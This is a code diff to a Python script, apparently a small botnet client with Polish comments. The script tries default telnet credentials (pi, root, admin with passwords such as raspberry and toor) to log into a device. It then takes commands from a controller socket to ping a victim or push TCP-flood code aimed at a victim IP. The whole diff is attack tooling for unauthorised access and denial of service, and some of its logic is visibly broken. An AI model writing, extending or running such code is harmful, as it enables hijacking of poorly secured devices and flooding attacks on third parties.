@@ -4,13 +4,13 @@ import telnetlib
 from _thread import start_new_thread
 
 attack = False
+attack_type=''
 
-
-def telnetConnect(ip_address, victimIP, attackType: int):
+def telnetConnect(ip_address, victimIP):
     # można zrobić pętlę do wczytywania user credentials z pliku
+    global attack_type
     users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
     passwords = ['Ciumcium', 'toor', 'admin', 'root', 'user', 'raspberry']
-    attackType=2
     ip_address="192.168.1.10"
     for user in users:
         print('connecting with login: ' + user)
@@ -38,8 +38,8 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 tn.close()
                 continue
 
-            print("attacktype= "+str(attackType))
-            if attackType == 1:  # note
+            print("attack type= "+str(attack_type))
+            if attack_type == '1':  # note
                 print('pingujemy..')
                 tn.write(b"ping 192.168.1.24\n")  # można zrobić wątki
                 if not attack:  # tu też
@@ -63,7 +63,7 @@ def telnetConnect(ip_address, victimIP, attackType: int):
 
                 # print(tn.read_all().decode('ascii'))
 
-            if attackType == 2:
+            if attack_type == '2':
                 file = open('tcp_flood_code.txt', 'r')
                 str1 = file.read()
                 str1.replace('1.1.1.1', victimIP)
@@ -91,13 +91,13 @@ def telnetConnect(ip_address, victimIP, attackType: int):
     # t.close()
 
 
-def checkForOtherDevices(ip, victimIP):
+def checkForOtherDevices(ip, victimIP,type):
     x = 2
     l = len(ip)
     g = ip.split('.')[-1]
     ip = ip[:l - len(g)]
     print('connecting to telnet...')
-    start_new_thread(telnetConnect, ("192.168.1.10", victimIP, 2))
+    start_new_thread(telnetConnect, ("192.168.1.10", victimIP, ))
     # while x < 254:
     #     if not attack:
     #         return
@@ -111,7 +111,7 @@ def checkForOtherDevices(ip, victimIP):
 
 
 if __name__ == '__main__':
-
+    global attack_type
     #HOST = '192.168.100.11'  # The server's hostname or IP address
     HOST = '127.0.0.1'
     PORT = 65432  # The port used by the server
@@ -141,9 +141,14 @@ if __name__ == '__main__':
                 time.sleep(1)
                 print("Connection established!")
             try:
-                data = str(s.recv(1).decode())
-                print('Received', str(data))
-                if str(data) == '1':
+                attack_type = str(s.recv(1).decode())
+                print('Received', str(attack_type))
+                if str(attack_type) == '1':
+                    victim_ip = str(s.recv(16).decode())
+                    print('victim address:' + str(victim_ip))
+                    checkForOtherDevices(HOST, victim_ip)
+                    attack = True
+                if str(attack_type) == '2':
                     victim_ip = str(s.recv(16).decode())
                     print('victim address:' + str(victim_ip))
                     checkForOtherDevices(HOST, victim_ip)
